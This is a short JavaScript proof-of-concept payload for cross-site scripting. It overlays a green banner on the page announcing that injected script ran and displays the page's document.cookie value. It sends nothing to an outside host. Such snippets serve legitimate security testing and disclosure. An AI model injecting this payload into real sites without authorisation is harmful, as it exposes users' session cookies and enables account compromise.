const div = document.createElement("div");
div.style.cssText = "position:fixed;top:0;left:0;width:100%;padding:20px;background:#0a0;color:#fff;font-size:24px;z-index:999999;";
div.innerHTML = "XSS PoC:<br>JS Executed Successfully.<br>document.cookie: \"" + document.cookie + "\"";
document.body.appendChild(div);
